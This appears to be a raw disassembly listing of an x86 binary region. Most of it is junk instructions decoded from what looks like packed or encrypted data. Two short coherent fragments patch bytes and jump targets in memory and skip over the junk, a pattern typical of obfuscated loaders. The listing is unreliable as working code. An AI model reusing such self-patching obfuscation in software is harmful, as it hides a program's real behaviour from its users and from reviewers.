  4038c3:	adc    DWORD PTR [esi+edi*4-0x58],ecx
  4038c7:	mov    edi,0xa2503fa3
  4038cc:	iret   
  4038cd:	mov    ebp,0xcd92f75c
  4038d2:	(bad)  
  4038d3:	mov    edi,0x35cdd88e
  4038d8:	cld    
  4038d9:	orps   xmm2,XMMWORD PTR [edi]
  4038dc:	retf   
  4038dd:	rcr    esi,cl
  4038df:	mov    cl,0x40
  4038e1:	(bad)  
  4038e2:	push   edx
  4038e3:	cmp    al,BYTE PTR [di]
  4038e6:	clc    
  4038e7:	cli    
  4038e8:	arpl   WORD PTR [ebx+0x5bbf445],cx
  4038ee:	xor    eax,ebp
  4038f0:	aas    
  4038f1:	dec    edi
  4038f2:	test   al,0xaa
  4038f4:	dec    ebp
  4038f5:	pop    ss
  4038f6:	adc    ebx,eax
  4038f8:	jb     0x4038b3
  4038fa:	dec    esi
  4038fb:	pusha  
  4038fc:	push   ss
  4038fd:	xor    edi,DWORD PTR [edx]
  4038ff:	push   0x60
  403901:	retf   0x80ae
  403904:	sub    BYTE PTR [ecx],bh
  403906:	arpl   WORD PTR [edx+eax*4-0x544215c6],sp
  40390d:	jmp    0x6c73:0x3fc672d
  403914:	(bad)  [edi+eiz*1+0x462006a8]
  40391b:	push   eax
  40391c:	push   eax
  40391d:	stos   DWORD PTR es:[edi],eax
  40391e:	idiv   esi
  403920:	pop    ebp
  403921:	xor    al,0x4d
  403923:	push   edx
  403924:	adc    eax,0x5cd691f9
  403929:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40392a:	sub    BYTE PTR [edi-0x34],ch
  40392d:	sbb    esp,DWORD PTR [ecx+0x1f5ce691]
  403933:	mov    ecx,0xdfd7b15e
  403938:	mov    ds:0xe805477b,eax
  40393d:	or     eax,0x61c158d
  403942:	mov    ch,0x73
  403944:	mov    eax,0x961d963a
  403949:	xor    al,0x6f
  40394b:	adc    dh,BYTE PTR [ebx-0x4c]
  40394e:	add    BYTE PTR ds:0x5788df59,bh
  403954:	scas   al,BYTE PTR es:[edi]
  403955:	jb     0x4038f4
  403957:	(bad)  
  403958:	cld    
  403959:	sbb    al,0xe5
  40395b:	fs stos DWORD PTR es:[edi],eax
  40395d:	mov    BYTE PTR ds:[eax-0x51494338],ah
  403964:	sahf   
  403965:	adc    DWORD PTR [ebp-0x41],esp
  403968:	lds    esp,FWORD PTR [ecx]
  40396a:	jb     0x4039b7
  40396c:	int    0x4a
  40396e:	xchg   ecx,eax
  40396f:	repz xor ch,0x1
  403973:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403974:	push   ds
  403975:	fstp   TBYTE PTR [edx-0x4a06108b]
  40397b:	mov    ecx,0x757959a5
  403980:	fdiv   DWORD PTR [edx]
  403982:	inc    esp
  403983:	ror    DWORD PTR [ebp-0x1e],0x49
  403987:	ins    BYTE PTR es:[edi],dx
  403988:	repnz push edi
  40398a:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40398c:	xchg   BYTE PTR [edi+0x2d1159d3],al
  403992:	dec    ebx
  403993:	push   ebp
  403994:	test   eax,eax
  403996:	je     0x403dd2
  40399c:	lea    eax,[ebp-0x98]
  4039a2:	push   eax
  4039a3:	mov    eax,DWORD PTR [ebp-0x1c]
  4039a6:	xor    eax,esi
  4039a8:	add    eax,edi
  4039aa:	push   eax
  4039ab:	mov    eax,DWORD PTR [ebp-0x18]
  4039ae:	add    eax,0xee
  4039b3:	push   eax
  4039b4:	mov    eax,DWORD PTR [ebp-0x18]
  4039b7:	mov    eax,DWORD PTR [eax+0x198]
  4039bd:	push   DWORD PTR [eax]
  4039bf:	jmp    0x403dcd
  4039c4:	push   es
  4039c5:	js     0x403a2e
  4039c7:	repnz popa 
  4039c9:	jno    0x40395e
  4039cb:	call   0xb3ee171
  4039d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039d1:	fisttp WORD PTR [ecx+0x7e1df7f2]
  4039d7:	jle    0x403a48
  4039d9:	jge    0x403a59
  4039db:	jle    0x403a19
  4039dd:	pop    edx
  4039de:	xchg   ebx,eax
  4039df:	cmp    DWORD PTR ds:0xf0998b5e,ebx
  4039e5:	addr16 push eax
  4039e7:	cmp    bh,BYTE PTR [edi]
  4039e9:	xchg   ebx,eax
  4039ea:	mov    ah,0x95
  4039ec:	and    eax,0x7b87006a
  4039f1:	icebp  
  4039f2:	ja     0x403a07
  4039f4:	sub    edi,DWORD PTR [esi]
  4039f6:	jl     0x403a66
  4039f8:	ror    DWORD PTR [ebp+0x730be4b3],cl
  4039fe:	sub    BYTE PTR [esi-0x18],al
  403a01:	dec    esi
  403a02:	test   DWORD PTR [edi],ebx
  403a04:	pop    edi
  403a05:	jp     0x4039f4
  403a07:	rcr    BYTE PTR [edi-0x5e936db8],cl
  403a0d:	and    al,0x2d
  403a0f:	into   
  403a10:	add    BYTE PTR ds:0x100a4a73,0x61
  403a17:	pushf  
  403a18:	mov    ah,BYTE PTR [ecx-0x59]
  403a1b:	push   ebp
  403a1c:	pop    ecx
  403a1d:	rcr    DWORD PTR [edx],cl
  403a1f:	pop    ds
  403a20:	int    0xeb
  403a22:	pop    ecx
  403a23:	and    esp,esi
  403a25:	(bad)  [ecx]
  403a27:	xchg   esi,eax
  403a28:	call   0xdb61:0xbb6740d5
  403a2f:	bound  ecx,QWORD PTR [esp+ecx*1]
  403a32:	xchg   esi,eax
  403a33:	jle    0x403a3b
  403a35:	mov    ebp,0xea0e773e
  403a3a:	test   DWORD PTR [edx],0xcfba2ac5
  403a40:	ds iret 
  403a42:	repnz cwde 
  403a44:	fwait
  403a45:	pop    edx
  403a46:	push   ds
  403a47:	ret    
  403a48:	mov    dl,0x78
  403a4a:	shr    DWORD PTR [ecx],0xff
  403a4d:	jmp    FWORD PTR [ebx-0x21997547]
  403a53:	dec    ebx
  403a54:	xchg   edx,eax
  403a55:	aas    
  403a56:	jg     0x403a0d
  403a58:	mov    al,0xe1
  403a5a:	aaa    
  403a5b:	dec    eax
  403a5c:	xlat   BYTE PTR ds:[ebx]
  403a5d:	jg     0x4039ea
  403a5f:	addr16 pop ecx
  403a61:	mov    esi,esp
  403a63:	xchg   ebx,edi
  403a65:	jne    0x403a2e
  403a67:	dec    edx
  403a68:	js     0x4039f4
  403a6a:	sub    BYTE PTR [ebp+0x2e],ch
  403a6d:	sub    eax,0xf4e2a051
  403a72:	inc    ebp
  403a73:	sbb    ah,BYTE PTR [edx-0x77bd940]
  403a79:	xor    al,BYTE PTR ds:0x211fec54
  403a7f:	lock or esi,DWORD PTR [ebx+0x492e3bf9]
  403a86:	lods   al,BYTE PTR ds:[esi]
  403a87:	aaa    
  403a88:	and    ebp,ebx
  403a8a:	and    eax,0x8a9fc292
  403a8f:	daa    
  403a90:	adc    al,0x97
  403a92:	mov    BYTE PTR [esi],0xae
  403a95:	jl     0x403ad6
  403a97:	sub    eax,0x98d768a
  403a9c:	outs   dx,BYTE PTR ds:[esi]
  403a9d:	xchg   bh,dl
  403a9f:	ss int3 
  403aa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403aa2:	push   es
  403aa3:	adc    eax,0x663f18ee
  403aa8:	xchg   esp,eax
  403aa9:	cmp    al,0xc6
  403aab:	out    dx,al
  403aac:	cmp    ah,BYTE PTR es:[eax-0x61]
  403ab0:	gs cli 
  403ab2:	sbb    al,0x6b
  403ab4:	inc    ebp
  403ab5:	sub    al,0xb7
  403ab7:	es mov esi,0x3983374
  403abd:	lock fistp QWORD PTR [esi+eiz*8]
  403ac1:	iret   
  403ac2:	je     0x403a55
  403ac4:	add    BYTE PTR [edi-0x3f028eca],0x3a
  403acb:	push   ds
  403acc:	or     al,bl
  403ace:	sbb    BYTE PTR ss:[ebx+0x3132c009],dh
  403ad5:	daa    
  403ad6:	or     BYTE PTR [ecx-0x6ea4519d],cl
  403adc:	dec    esi
  403add:	jno    0x403a9b
  403adf:	jp     0x403a9b
  403ae1:	pop    ecx
  403ae2:	add    al,0xd9
  403ae4:	push   eax
  403ae5:	es cwde 
  403ae7:	addr16 adc al,0xa4
  403aea:	push   0xffffff91
  403aec:	cmp    dh,BYTE PTR [ebx]
  403aee:	mov    cl,0xbe
  403af0:	sbb    eax,0xc8173b55
  403af5:	into   
  403af6:	nop
  403af7:	dec    esp
  403af8:	xor    DWORD PTR [ebx+0x7560ab8f],ebp
  403afe:	addr16 mov edx,0x62ab62c4
  403b04:	sub    dh,BYTE PTR [esi]
  403b06:	aas    
  403b07:	sub    DWORD PTR [esi-0x4b],edi
  403b0a:	xchg   ecx,eax
  403b0b:	fidivr DWORD PTR [edx]
  403b0d:	(bad)  
  403b0e:	and    esp,eax
  403b10:	les    ecx,FWORD PTR [ebx]
  403b12:	sub    edx,eax
  403b14:	cmp    al,0x40
  403b16:	cmc    
  403b17:	sbb    eax,0x25295fdd
  403b1c:	rcr    DWORD PTR [edi],cl
  403b1e:	xor    eax,0xdcaeb96
  403b23:	and    DWORD PTR [ecx],0xffffffce
  403b26:	push   ss
  403b27:	and    BYTE PTR [edi-0x11],al
  403b2a:	jmp    0x403b95
  403b2c:	pop    edi
  403b2d:	pop    ebp
  403b2e:	or     eax,0x58528702
  403b33:	ror    BYTE PTR fs:[edx],cl
  403b36:	pop    edx
  403b37:	jp     0x403ba3
  403b39:	mov    BYTE PTR [edi-0x18],ch
  403b3c:	push   ecx
  403b3d:	push   ebp
  403b3e:	cmp    ebx,DWORD PTR es:[eax-0x51280f4f]
  403b45:	inc    ebp
  403b46:	xor    al,0x5a
  403b48:	xchg   ebp,eax
  403b49:	add    edx,0x23f8a44a
  403b4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b50:	enter  0x7912,0xce
  403b54:	or     DWORD PTR [eax-0x5f5968df],ebp
  403b5a:	inc    ecx
  403b5b:	test   al,0x4e
  403b5d:	and    dh,BYTE PTR [esi-0x4]
  403b60:	bound  ebp,QWORD PTR [ebx+0x50355568]
  403b66:	(bad)  
  403b67:	and    edx,DWORD PTR [edi-0x17078d5b]
  403b6d:	pop    ecx
  403b6e:	xor    eax,0x28fd1850
  403b73:	xor    ecx,DWORD PTR [ecx-0x2b]
  403b76:	repnz pop edi
  403b78:	out    0x4e,eax
  403b7a:	and    al,0x5e
  403b7c:	ret    
  403b7d:	in     eax,dx
  403b7e:	retf   
  403b7f:	jecxz  0x403b7e
  403b81:	test   al,0x62
  403b83:	int3   
  403b84:	hlt    
  403b85:	sub    DWORD PTR [ebx+0x6],eax
  403b88:	lahf   
  403b89:	dec    ecx
  403b8a:	adc    eax,0x3436f616
  403b8f:	std    
  403b90:	push   esp
  403b91:	(bad)  
  403b92:	je     0x403b37
  403b94:	lock mov ah,0xc9
  403b97:	std    
  403b98:	add    ah,BYTE PTR [esi+0xf]
  403b9b:	and    DWORD PTR [eax+0x453a773],0x74
  403ba2:	loope  0x403bb4
  403ba4:	sar    eax,1
  403ba6:	pop    esi
  403ba7:	sub    DWORD PTR [ecx+0x41],esp
  403baa:	test   bh,bh
  403bac:	hlt    
  403bad:	out    0x90,al
  403baf:	fst    QWORD PTR [edx]
  403bb1:	mov    fs,WORD PTR [edi+esi*1]
  403bb4:	inc    ebp
  403bb5:	out    dx,al
  403bb6:	sbb    BYTE PTR [edi],bl
  403bb8:	xor    al,0x2a
  403bba:	mov    eax,0x1c8455d8
  403bbf:	mov    eax,DWORD PTR ds:[edx-0x1]
  403bc3:	(bad)  
  403bc4:	jmp    0x8d11:0x3aae56db
  403bcb:	xchg   dh,ah
  403bcd:	cmp    DWORD PTR ds:[esi+0x7df0030d],ecx
  403bd4:	iret   
  403bd5:	mov    ds:0x577fd3ae,al
  403bda:	and    ecx,DWORD PTR [eax+0x73]
  403bdd:	jmp    0x403be2
  403bdf:	xor    edi,ebp
  403be1:	arpl   WORD PTR [ecx+ebp*2],di
  403be4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403be5:	jp     0x403b79
  403be7:	dec    ecx
  403be8:	in     eax,dx
  403be9:	sbb    DWORD PTR [eax-0x77],edx
  403bec:	in     eax,0x62
  403bee:	push   eax
  403bef:	outs   dx,BYTE PTR ds:[esi]
  403bf0:	inc    esi
  403bf1:	and    ah,BYTE PTR [ebx+edi*8-0x16f6e018]
  403bf8:	inc    eax
  403bf9:	popa   
  403bfa:	and    DWORD PTR [edi-0x156ccf5],0x2e
  403c01:	sbb    eax,edi
  403c03:	lods   al,BYTE PTR ds:[esi]
  403c04:	mov    al,0x77
  403c06:	ins    DWORD PTR es:[edi],dx
  403c07:	xchg   DWORD PTR [ebx],edi
  403c09:	xchg   esp,eax
  403c0a:	pop    ebx
  403c0b:	mov    ebp,0xeb94f3ae
  403c10:	in     al,0xbd
  403c12:	ret    0xc0a6
  403c15:	xchg   ebx,eax
  403c16:	xor    ecx,DWORD PTR [ecx+0x4d]
  403c19:	out    dx,al
  403c1a:	bound  eax,QWORD PTR [ebx]
  403c1c:	xchg   edi,esi
  403c1e:	in     eax,0x0
  403c20:	add    BYTE PTR [edi+0x31],ch
  403c23:	pop    es
  403c24:	fisttp DWORD PTR [ebp+0x1c]
  403c27:	(bad)  
  403c28:	scas   al,BYTE PTR es:[edi]
  403c29:	push   edx
  403c2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c2b:	stos   BYTE PTR es:[edi],al
  403c2c:	ret    
  403c2d:	push   0x7
  403c2f:	pop    esp
  403c30:	ffree  st(6)
  403c32:	(bad)  
  403c33:	out    dx,al
  403c34:	mov    DWORD PTR [eax-0x9],esi
  403c37:	push   esp
  403c38:	sub    DWORD PTR [ecx],0x2d
  403c3b:	mov    gs,edx
  403c3d:	fisubr WORD PTR [eax-0x6c]
  403c40:	adc    eax,DWORD PTR [eax]
  403c42:	jp     0x403c5f
  403c44:	rcr    DWORD PTR [edx+0x11],0x9b
  403c48:	pop    esp
  403c49:	imul   esp,DWORD PTR es:[edi+0x63],0x11bde126
  403c51:	push   ds
  403c52:	cmp    eax,0xd5cc2c31
  403c57:	cmp    dl,cl
  403c59:	jmp    0x403bf8
  403c5b:	dec    ebx
  403c5c:	or     al,0x8b
  403c5e:	sbb    BYTE PTR [ebx-0x67],0x0
  403c62:	jecxz  0x403cb7
  403c64:	mov    ecx,?
  403c66:	cmp    eax,0x3929083a
  403c6b:	dec    ebp
  403c6c:	adc    BYTE PTR [ebp+ebx*4+0x39],ch
  403c70:	mov    ebp,0x809d2203
  403c75:	loope  0x403bf7
  403c77:	jg     0x403c49
  403c79:	jb     0x403c05
  403c7b:	jne    0x403c9f
  403c7d:	jne    0x403c36
  403c7f:	cwde   
  403c80:	int    0xdd
  403c82:	cmc    
  403c83:	lods   eax,DWORD PTR ds:[esi]
  403c84:	jl     0x403ce9
  403c86:	adc    BYTE PTR [edx-0x3f38125b],ch
  403c8c:	sbb    BYTE PTR [ebx-0x12b3f70b],0x32
  403c93:	stc    
  403c94:	mov    bh,0xd5
  403c96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c97:	js     0x403c6b
  403c99:	push   0x4521288
  403c9e:	adc    DWORD PTR [edi+0x6afe3e99],0xfa849630
  403ca8:	push   ebx
  403ca9:	aaa    
  403caa:	(bad)
  403cad:	stos   DWORD PTR es:[edi],eax
  403cae:	xor    edx,eax
  403cb0:	les    ebx,FWORD PTR [edi+0x75]
  403cb3:	enter  0x2ea7,0x8e
  403cb7:	sahf   
  403cb8:	mov    eax,ds:0x78f1fcb7
  403cbd:	push   0xa8f17dca
  403cc2:	fnsave [esi]
  403cc4:	mov    eax,0x947aceb7
  403cc9:	xor    eax,0x9e3d1b8c
  403cce:	jbe    0x403cbd
  403cd0:	dec    ebx
  403cd1:	dec    dl
  403cd3:	xchg   ebx,eax
  403cd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403cd5:	fisub  DWORD PTR [edi+ebp*8+0x7d3edef4]
  403cdc:	xor    ebp,edi
  403cde:	cs out 0x38,al
  403ce1:	xchg   ebx,eax
  403ce2:	xchg   ecx,eax
  403ce3:	push   cs
  403ce4:	fst    DWORD PTR [edx+edi*8+0x6d36b99]
  403ceb:	push   edi
  403cec:	std    
  403ced:	rcl    al,0x77
  403cf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403cf1:	test   eax,0x6bca7473
  403cf6:	pop    ds
  403cf7:	popa   
  403cf8:	enter  0x7a1b,0x83
  403cfc:	leave  
  403cfd:	jmp    0x9a3e:0xc0fbedae
  403d04:	and    eax,0x52279841
  403d09:	lahf   
  403d0a:	add    al,0x54
  403d0c:	nop
  403d0d:	call   0x74504266
  403d12:	mov    ebx,0x8afc560e
  403d17:	call   0x3879:0x1a636dc0
  403d1e:	imul   edi,DWORD PTR [eax-0x5e],0x3d44db73
  403d25:	aas    
  403d26:	(bad)  
  403d27:	shr    BYTE PTR [ebp-0x6eab919b],1
  403d2d:	or     ecx,DWORD PTR [ebp+0x20cc4559]
  403d33:	popf   
  403d34:	jge    0x403d2e
  403d36:	cmp    dl,bl
  403d38:	stc    
  403d39:	cld    
  403d3a:	lds    ebp,FWORD PTR [edi-0x49]
  403d3d:	je     0x403d46
  403d3f:	ficom  WORD PTR ds:0xe3d72a6c
  403d45:	push   ebp
  403d46:	sti    
  403d47:	xor    cl,bh
  403d49:	mov    eax,ds:0xf033cb3a
  403d4e:	mov    dh,0xa2
  403d50:	and    DWORD PTR ds:0xab6f601c,ebp
  403d56:	(bad)
  403d5a:	inc    eax
  403d5b:	inc    esp
  403d5c:	xchg   ebx,eax
  403d5d:	xchg   esp,eax
  403d5e:	or     BYTE PTR [esi+0x4ba6668],bh
  403d64:	in     eax,dx
  403d65:	dec    edi
  403d66:	enter  0x4bba,0xfb
  403d6a:	cmp    al,0xdb
  403d6c:	mov    ds:0x65e68ae,eax
  403d71:	mov    edx,0x28efd08a
  403d76:	jb     0x403d5e
  403d78:	add    BYTE PTR [edx+0xc],al
  403d7b:	repnz dec ecx
  403d7d:	dec    ecx
  403d7e:	ffree  st(1)
  403d80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d81:	push   esi
  403d82:	push   ds
  403d83:	or     DWORD PTR [edx],ebp
  403d85:	xchg   edi,eax
  403d86:	mov    DWORD PTR [ebx-0x37],esi
  403d89:	test   al,0x7
  403d8b:	jl     0x403de6
  403d8d:	dec    edi
  403d8e:	sbb    DWORD PTR [edx+0x7c],esi
  403d91:	mov    edi,0xe037cb19
  403d96:	pop    eax
  403d97:	pop    ss
  403d98:	mov    edx,0x47fd7e45
  403d9d:	jmp    0xf285:0x46ee1a91
  403da4:	fs repz mov al,0x83
  403da8:	xor    cl,BYTE PTR [esi-0x1ebf0f75]
  403dae:	xor    BYTE PTR [ebx],0xc4
  403db1:	and    ebp,DWORD PTR [esi+0x45]
  403db4:	mov    fs,WORD PTR [edi+ebx*2-0x46ea0eb4]
  403dbb:	(bad)  
  403dbc:	out    0x36,al
  403dbe:	pop    ebp
  403dbf:	fcmovnu st,st(4)
  403dc1:	pop    ecx
  403dc2:	mov    bl,0x5a
  403dc4:	fnstenv [edi]
  403dc6:	popf   
  403dc7:	push   esp
  403dc8:	call   0xc7e8:0xf6e1c716
  403dcf:	add    BYTE PTR [eax],0x0
  403dd2:	mov    ecx,DWORD PTR [ebp-0x28]
  403dd5:	xor    ecx,esi
  403dd7:	mov    eax,0xffcd8d65
  403ddc:	sub    eax,ecx
  403dde:	sub    eax,DWORD PTR [ebp-0x4]
  403de1:	mov    ecx,DWORD PTR [ebp-0x48]
  403de4:	add    ecx,eax
  403de6:	mov    eax,DWORD PTR [ebp-0x4]
  403de9:	mov    DWORD PTR [eax+0x1],ecx
  403dec:	mov    al,BYTE PTR [ebp-0x11]
  403def:	mov    ecx,DWORD PTR [ebp-0x4]
  403df2:	xor    al,0x46
  403df4:	sub    al,0x38
  403df6:	mov    BYTE PTR [ecx],al
  403df8:	lea    eax,[ebp-0x4]
  403dfb:	inc    BYTE PTR [eax]
  403dfd:	inc    eax
  403dfe:	push   eax
  403dff:	pop    ecx
  403e00:	dec    ecx
  403e01:	jmp    0x40420f
  403e06:	dec    esp
  403e07:	repz repz adc esi,DWORD PTR [ecx+0x13]
  403e0c:	ins    BYTE PTR es:[edi],dx
  403e0d:	jno    0x403e09
  403e0f:	in     eax,0x73
  403e11:	sbb    DWORD PTR [ecx],esi
  403e13:	push   cs
  403e14:	imul   edi,DWORD PTR [esp+eiz*8],0x6f7e7e19
  403e1b:	jge    0x403e9b
  403e1d:	jle    0x403db1
  403e1f:	sbb    al,cl
  403e21:	and    eax,0xd4b2ba46
  403e26:	mov    dh,0xc9
  403e28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e29:	and    ah,BYTE PTR [eax-0x525f9bca]
  403e2f:	outs   dx,DWORD PTR ds:[esi]
  403e30:	xchg   esi,eax
  403e31:	xlat   BYTE PTR es:[ebx]
  403e33:	clc    
  403e34:	dec    esi
  403e35:	enter  0xcc18,0x7e
  403e39:	out    0xc7,eax
  403e3b:	mov    dh,0xaf
  403e3d:	mov    dl,0xe3
  403e3f:	pusha  
  403e40:	sub    dh,BYTE PTR [ebp+edx*8-0x1f3e57ad]
  403e47:	xor    DWORD PTR [eax-0x7a],ebp
  403e4a:	sub    DWORD PTR [eax],esp
  403e4c:	fadd   QWORD PTR [edx-0x5df44e05]
  403e52:	into   
  403e53:	lahf   
  403e54:	push   0xf
  403e56:	add    BYTE PTR [ebx+ebx*8],al
  403e59:	inc    ebx
  403e5a:	jno    0x403e7f
  403e5c:	loop   0x403ed0
  403e5e:	mov    cs,WORD PTR [edi-0x1ea4f1fc]
  403e64:	test   esi,esi
  403e66:	ficom  WORD PTR [ebp+0x1fd772da]
  403e6c:	(bad)  
  403e6d:	fxam   
  403e6f:	xchg   ebx,eax
  403e70:	dec    BYTE PTR [esp+ebp*1-0x48]
  403e74:	(bad)  
  403e75:	lock test esi,ecx
  403e78:	inc    ebx
  403e79:	inc    esi
  403e7a:	test   DWORD PTR [esi-0x3],ebx
  403e7d:	mov    es,WORD PTR [ecx+ecx*8-0x48]
  403e81:	push   ecx
  403e82:	lock adc eax,0x3579b15f
  403e88:	jnp    0x403e54
  403e8a:	xlat   BYTE PTR ds:[ebx]
  403e8b:	mov    dh,0x23
  403e8d:	and    ebx,DWORD PTR [eax+ebp*1]
  403e90:	retf   0x6947
  403e93:	pop    ecx
  403e94:	sbb    esi,DWORD PTR [edi-0x2500661c]
  403e9a:	jno    0x403e1f
  403e9c:	(bad)  [ebp+0x109ac0b8]
  403ea2:	arpl   ax,bp
  403ea4:	mov    BYTE PTR [ecx-0x1b],cl
  403ea7:	sub    al,0x2f
  403ea9:	pop    esi
  403eaa:	jle    0x403ecd
  403eac:	pop    esp
  403ead:	or     DWORD PTR [ebx-0x4f],ebx
  403eb0:	jmp    0x829eab37
  403eb5:	sub    cl,BYTE PTR [edx-0x2e]
  403eb8:	aas    
  403eb9:	aaa    
  403eba:	push   ds
  403ebb:	adc    ah,BYTE PTR [esi]
  403ebd:	enter  0xd2e1,0xd6
  403ec1:	inc    edx
  403ec2:	push   0xffffff8a
  403ec4:	sbb    al,0xd6
  403ec6:	sbb    eax,0xa495d381
  403ecb:	data16 jns 0x403f11
  403ece:	cdq    
  403ecf:	xchg   al,dl
  403ed1:	pop    edx
  403ed2:	adc    BYTE PTR [ebx-0x2c],0xad
  403ed6:	mov    edi,0xe82ee38f
  403edb:	dec    ebx
  403edc:	dec    edx
  403edd:	xor    esp,DWORD PTR [edx-0x51]
  403ee0:	in     al,0x8d
  403ee2:	add    bl,bl
  403ee4:	shl    bl,1
  403ee6:	dec    edi
  403ee7:	jae    0x403eb4
  403ee9:	iret   
  403eea:	loop   0x403f18
  403eec:	or     DWORD PTR [ecx],ecx
  403eee:	inc    BYTE PTR ds:0x62218033
  403ef4:	xchg   esi,eax
  403ef5:	dec    ebx
  403ef6:	sbb    dl,dl
  403ef8:	pusha  
  403ef9:	push   ebp
  403efa:	iret   
  403efb:	xor    BYTE PTR [edi-0x77],bl
  403efe:	cli    
  403eff:	call   0x7da2da08
  403f04:	push   esp
  403f05:	cmp    al,0x4a
  403f07:	(bad)  [esp+ebp*1-0x47]
  403f0b:	xor    BYTE PTR [edx+0x2e],cl
  403f0e:	out    dx,eax
  403f0f:	jns    0x403f45
  403f11:	dec    ebp
  403f12:	nop
  403f13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f14:	jbe    0x403ea9
  403f16:	and    eax,eax
  403f18:	sub    al,0xc3
  403f1a:	pop    es
  403f1b:	sahf   
  403f1c:	xchg   edx,eax
  403f1d:	fcmovnbe st,st(5)
  403f1f:	je     0x403f0d
  403f21:	xchg   esi,eax
  403f22:	mov    DWORD PTR [ecx+0x2b704a58],ecx
  403f28:	jle    0x403f4e
  403f2a:	dec    esp
  403f2b:	sub    eax,DWORD PTR [edi]
  403f2d:	cmp    BYTE PTR [ebp-0x68f4842b],0xad
  403f34:	stos   BYTE PTR es:[edi],al
  403f35:	in     al,dx
  403f36:	xlat   BYTE PTR ds:[ebx]
  403f37:	jp     0x403ec3
  403f39:	or     ah,dl
  403f3b:	inc    ebp
  403f3c:	scas   eax,DWORD PTR es:[edi]
  403f3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f3e:	inc    esi
  403f3f:	stos   BYTE PTR es:[edi],al
  403f40:	push   ds
  403f41:	and    BYTE PTR [edi],0xde
  403f44:	cwde   
  403f45:	pushf  
  403f46:	aaa    
  403f47:	fs jae 0x403f2b
  403f4a:	pop    ebx
  403f4b:	(bad)  
  403f4c:	push   es
  403f4d:	push   esi
  403f4e:	push   cs
  403f4f:	pop    ds
  403f50:	inc    ecx
  403f51:	ret    
  403f52:	cmp    eax,0x94ca4b0a
  403f57:	rol    bh,cl
  403f59:	jecxz  0x403f65
  403f5b:	mov    al,ds:0x427ee87e
  403f60:	jno    0x403f0c
  403f62:	repnz push ss
  403f64:	sbb    ah,BYTE PTR [bp+si]
  403f67:	or     bl,BYTE PTR [eax]
  403f69:	mov    ecx,0x884bb3bd
  403f6e:	rcr    BYTE PTR [esp+eax*4-0x13],1
  403f72:	gs addr16 push 0x89ed532f
  403f79:	xor    ecx,DWORD PTR [esp+eax*1-0x2]
  403f7d:	jecxz  0x403f3f
  403f7f:	xchg   esi,eax
  403f80:	sar    ah,cl
  403f82:	add    BYTE PTR [edx],cl
  403f84:	xor    eax,0xe33ec83c
  403f89:	(bad)  
  403f8a:	dec    ebp
  403f8b:	es push ss
  403f8d:	pop    ecx
  403f8e:	mov    WORD PTR [ecx],cs
  403f90:	push   esi
  403f91:	xor    DWORD PTR ds:0x83f3ea04,edi
  403f97:	mov    ch,0x48
  403f99:	es addr16 es sbb dh,bl
  403f9e:	add    eax,DWORD PTR [ecx]
  403fa0:	mov    ah,0xf3
  403fa2:	mov    WORD PTR [ebx+0x655d7a16],cs
  403fa8:	test   DWORD PTR [ebx-0x31ea70e1],ebp
  403fae:	mov    bh,0x76
  403fb0:	iret   
  403fb1:	sub    BYTE PTR [ebp-0x23f9c624],0xc
  403fb8:	sbb    DWORD PTR ds:0x8695a5b0,0x62
  403fbf:	push   es
  403fc0:	mov    ebp,0x65be939
  403fc5:	int    0x96
  403fc7:	sub    BYTE PTR [ebp+0x74],0xe6
  403fcb:	dec    DWORD PTR [ecx+0x85c7f7d]
  403fd1:	or     DWORD PTR [edi],ebp
  403fd3:	jbe    0x403f8d
  403fd5:	leave  
  403fd6:	adc    edx,esp
  403fd8:	in     eax,0xea
  403fda:	xchg   edi,eax
  403fdb:	(bad)  
  403fdd:	adc    ebx,ebx
  403fdf:	je     0x403fee
  403fe1:	lea    ebp,[edi+ebx*2-0x61]
  403fe5:	aaa    
  403fe6:	dec    esi
  403fe7:	int3   
  403fe8:	or     BYTE PTR [edx-0x6e2d7e50],dl
  403fee:	push   edx
  403fef:	dec    esp
  403ff0:	mov    WORD PTR [edx],fs
  403ff2:	xor    al,0xe1
  403ff4:	inc    edx
  403ff5:	xchg   edx,eax
  403ff6:	and    al,0x2d
  403ff8:	mov    ah,0xda
  403ffa:	sbb    edx,edi
  403ffc:	jecxz  0x404079
  403ffe:	xor    BYTE PTR [edx+0x18],dh
  404001:	lods   eax,DWORD PTR ds:[esi]
  404002:	jge    0x40402e
  404004:	mov    esi,0xf7e71beb
  404009:	lods   eax,DWORD PTR ds:[esi]
  40400a:	sbb    BYTE PTR [eax-0x569f041f],dl
  404010:	in     eax,0x5c
  404012:	rcr    dh,0xac
  404015:	inc    eax
  404016:	shl    BYTE PTR [ebp-0x39],0xfd
  40401a:	out    dx,al
  40401b:	out    dx,eax
  40401c:	cwde   
  40401d:	rcl    BYTE PTR [ecx-0x59],0x18
  404021:	mov    DWORD PTR [edx-0x1df624da],ecx
  404027:	xor    esi,DWORD PTR [ebx+0x51a3c9ab]
  40402d:	or     ecx,DWORD PTR [esi]
  40402f:	mov    ecx,0x40b36b94
  404034:	inc    edx
  404035:	out    0x6b,al
  404037:	xchg   edi,eax
  404038:	push   ebp
  404039:	fiadd  DWORD PTR [ecx-0x70]
  40403c:	and    bh,BYTE PTR [ecx-0x5d]
  40403f:	add    dl,0x3
  404042:	scas   eax,DWORD PTR es:[edi]
  404043:	loopne 0x4040c3
  404045:	daa    
  404046:	pop    ss
  404047:	pushf  
  404048:	int3   
  404049:	(bad)  
  40404a:	dec    ebp
  40404b:	jmp    0xc9da:0x48b8fb86
  404052:	aaa    
  404053:	icebp  
  404054:	dec    ecx
  404055:	and    DWORD PTR [eax+edx*2],ebp
  404058:	pushf  
  404059:	pusha  
  40405a:	add    BYTE PTR [eax-0x1a9545d7],ah
